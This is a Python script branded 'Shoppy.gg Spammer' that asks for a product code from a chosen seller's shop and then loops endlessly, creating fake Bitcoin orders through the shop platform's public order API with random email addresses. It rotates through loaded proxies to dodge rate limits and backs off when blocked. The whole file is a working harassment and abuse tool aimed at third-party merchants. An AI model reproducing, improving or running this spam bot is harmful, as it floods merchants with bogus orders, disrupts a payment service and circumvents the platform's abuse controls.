import requests, random, string, time, os
from json import JSONDecodeError
from colorama import Fore, Style
from pystyle import Colors, Colorate, Center
from yaspin import yaspin
from yaspin.spinners import Spinners
from rich import print as rprint
from rich.panel import Panel

logo = """
███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
███████╗███████║██║   ██║██████╔╝██████╔╝ ╚████╔╝     ███████╗██████╔╝███████║██╔████╔██║
╚════██║██╔══██║██║   ██║██╔═══╝ ██╔═══╝   ╚██╔╝      ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
███████║██║  ██║╚██████╔╝██║     ██║        ██║       ███████║██║     ██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝        ╚═╝       ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝"""

sent_count = 0
ratelimited_count = 0

# Clear function
clear = lambda: os.system("cls" if os.name in ("nt", "dos") else "clear") # Don't touch this.

os.system(f"title Shoppy.gg Spammer - discord.gg/kws")

# Function to get random spinner from yaspin
def get_spinner():
    spinners = [Spinners.balloon2, Spinners.bouncingBall, Spinners.pong, Spinners.point, Spinners.arc, Spinners.aesthetic, Spinners.star]
    return random.choice(spinners)

# Function to delay execution with a spinner for a given amount of time
def spinner(seconds):
    with yaspin(get_spinner(), text=f" Wait {seconds} seconds...", timer=True) as sp:
        time.sleep(seconds)
        sp.ok()

# Check if proxies.txt exists and create it if it doesn't
def file_exists():
    if not os.path.exists("proxies.txt"):
        open("proxies.txt", "w").close()
        print(f"{Fore.RED}>{Fore.RESET} The proxies.txt file didn't exist, so I created it for you. Please add proxies to proxies.txt and restart the program.")
        print(f"{Fore.CYAN}>{Fore.RESET} Press enter to exit...")
        input()
        exit()

# Set up the proxies
PROXYLESS = False  # Set to True if you don't want to use proxies or to False if you want to use proxies.
PROXIES = []  # List of proxies.

# Load proxies from proxies.txt
def load_proxies():
    global PROXIES
    if not PROXYLESS:
        with open("proxies.txt", "r") as f:
            PROXIES = [line.strip() for line in f]

        if not PROXIES:
            print(f"{Fore.RED}>{Fore.RESET} You have proxies enabled, but no proxies in proxies.txt. Please add proxies to proxies.txt or disable proxyless mode.")
            print(f"{Fore.CYAN}>{Fore.RESET} Press enter to exit...")
            input()
            exit()

# Random string generator
def get_random_string(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

# Clear the console
clear()

# Print logo
print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, logo, 1)))
print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, "------------------------------------------------------------------------------------------\n\n", 1)))
file_exists()
load_proxies()

os.system(f"title Shoppy.gg Spammer - Ready to spam! - discord.gg/kws")

# Get product code
print(f"{Fore.CYAN}>{Fore.RESET} Enter some valid product code from the shop you want to spam.")
print(f"{Fore.CYAN}>{Fore.RESET} (e.g., https://shoppy.gg/product/0sv149x, where 0sv149x is the code)")
product = input(f"{Fore.MAGENTA}>{Fore.RESET} Code: ")
print()

# Main loop
while True:

    data = {
        "email": f"{get_random_string(10)}@gmail.com",
        "fields": [],
        "gateway": "BTC",
        "product": product,
        "quantity": 1
    }

    if PROXYLESS:
        data = requests.put('https://shoppy.gg/api/v1/public/order/store', json=data)
    else:
        proxy = random.choice(PROXIES)
        proxy_dict = {"http": f"http://{proxy}"}
        data = requests.put('https://shoppy.gg/api/v1/public/order/store', json=data, proxies=proxy_dict)

    try:

        # Convert JSON data to Python dictionary
        json_data = data.json()

        # Extract values from the dictionary
        status = json_data["status"]
        order_id = json_data["order"]["id"]
        is_crypto = json_data["order"]["is_crypto"]
        gateway = json_data["order"]["gateway"]
        required_confirmations = json_data["order"]["required_confirmations"]
        return_url = json_data["order"]["return_url"]
        crypto_address = json_data["order"]["crypto_address"]
        crypto_amount = json_data["order"]["crypto_amount"]

        # Use a rich panel to encapsulate the output
        rprint(Panel.fit(f"""
        [bold green]>[/bold green] [bold white]Status[/bold white]: [bold green]{status}[/bold green]
        [bold green]>[/bold green] [bold white]Order ID[/bold white]: [bold green]{order_id}[/bold green]
        [bold green]>[/bold green] [bold white]Is crypto[/bold white]: [bold green]{is_crypto}[/bold green]
        [bold green]>[/bold green] [bold white]Gateway[/bold white]: [bold green]{gateway}[/bold green]
        [bold green]>[/bold green] [bold white]Required confirmations[/bold white]: [bold green]{required_confirmations}[/bold green]
        [bold green]>[/bold green] [bold white]Return URL[/bold white]: [bold green]{return_url}[/bold green]
        [bold green]>[/bold green] [bold white]Crypto address[/bold white]: [bold green]{crypto_address}[/bold green]
        [bold green]>[/bold green] [bold white]Crypto amount[/bold white]: [bold green]{crypto_amount}[/bold green]
        """))

        sent_count += 1

    except JSONDecodeError as e:
        rprint(Panel.fit(f"[bold red]>[/bold red] [bold white]Ratelimited![/bold white]"))
        ratelimited_count += 1
        spinner(60)

    os.system(f"title Shoppy.gg Spammer - Sent: {sent_count} - Ratelimited: {ratelimited_count} - Product: {product} - discord.gg/kws")